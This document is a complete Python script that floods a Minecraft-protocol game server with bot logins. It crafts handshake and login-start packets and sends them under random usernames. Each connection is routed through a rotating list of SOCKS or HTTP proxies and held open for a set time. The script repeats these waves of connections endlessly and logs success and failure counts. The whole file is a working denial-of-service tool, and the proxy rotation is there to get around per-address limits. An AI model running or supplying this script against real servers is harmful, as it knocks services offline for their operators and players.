import socket
import socks
import struct
import random
import string
import time
import sys
import threading
from datetime import datetime

if len(sys.argv) != 7:
    print(f"usage: python {sys.argv[0]} <ip> <port> <count> <protocol> <hold_time> <proxy_list.txt>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
count = int(sys.argv[3])
protocol = int(sys.argv[4])
hold_time = float(sys.argv[5])
proxy_file = sys.argv[6]

with open(proxy_file) as f:
    proxies = [line.strip() for line in f if line.strip()]

success_count = 0
fail_count = 0
lock = threading.Lock()

def make_varint(value):
    result = b""
    while True:
        temp = value & 0x7F
        value >>= 7
        if value != 0:
            temp |= 0x80
        result += struct.pack("B", temp)
        if value == 0:
            break
    return result

def make_handshake_packet(ip, port, protocol):
    packet_id = b'\x00'
    protocol_version = make_varint(protocol)
    server_address = ip.encode("utf-8")
    server_address_length = struct.pack("B", len(server_address))
    server_port = struct.pack(">H", port)
    next_state = b'\x02'
    data = packet_id + protocol_version + server_address_length + server_address + server_port + next_state
    return make_varint(len(data)) + data

def make_login_start_packet(username):
    packet_id = b'\x00'
    username_encoded = username.encode("utf-8")
    username_length = struct.pack("B", len(username_encoded))
    data = packet_id + username_length + username_encoded
    return make_varint(len(data)) + data

def random_username(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_proxy():
    return random.choice(proxies)

def parse_proxy(proxy_str):
    parts = proxy_str.split(':')
    if len(parts) < 2:
        raise ValueError(f"invalid proxy format: {proxy_str}")
    
    ip = parts[0]
    port = int(parts[1])
    ptype = parts[2].lower() if len(parts) > 2 else 'socks5'

    if ptype == 'socks4':
        proxy_type = socks.SOCKS4
    elif ptype == 'http':
        proxy_type = socks.HTTP
    else:
        proxy_type = socks.SOCKS5

    return ip, port, proxy_type

def bot_thread(index):
    global success_count, fail_count

    username = random_username()
    proxy = get_proxy()

    try:
        proxy_ip, proxy_port, proxy_type = parse_proxy(proxy)

        s = socks.socksocket()
        s.set_proxy(proxy_type, proxy_ip, proxy_port)
        s.settimeout(5)
        s.connect((ip, port))

        handshake = make_handshake_packet(ip, port, protocol)
        login = make_login_start_packet(username)

        s.sendall(handshake)
        s.sendall(login)

        with lock:
            success_count += 1
            print(f"[{index+1}] connected: {username} via {proxy}")

        time.sleep(hold_time)

        msg = "disconnecting".encode("utf-8")
        msg_len = struct.pack("B", len(msg))
        disconnect_packet = b'\x14' + msg_len + msg
        s.sendall(make_varint(len(disconnect_packet)) + disconnect_packet)
        s.close()

    except Exception as e:
        with lock:
            fail_count += 1
            print(f"[{index+1}] failed {username} via {proxy}: {e}")

def run_wave():
    threads = []
    for i in range(count):
        t = threading.Thread(target=bot_thread, args=(i,))
        t.start()
        threads.append(t)
        time.sleep(0.02)

    for t in threads:
        t.join()

try:
    while True:
        start_time = time.time()
        print(f"\nstarting : {count} bots | protocol: {protocol} | hold: {hold_time}s")
        success_count = 0
        fail_count = 0

        run_wave()

        duration = time.time() - start_time
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"\nreport [{timestamp}]")
        print(f"success: {success_count}")
        print(f"failures: {fail_count}")
        print(f"duration: {duration:.2f} seconds")

        with open("bot_log.txt", "a") as log:
            log.write(f"[{timestamp}] success: {success_count}, fail: {fail_count}, duration: {duration:.2f}s\n")

        time.sleep(1)

except KeyboardInterrupt:
    print("\n[!] stopped.")
    sys.exit(0)
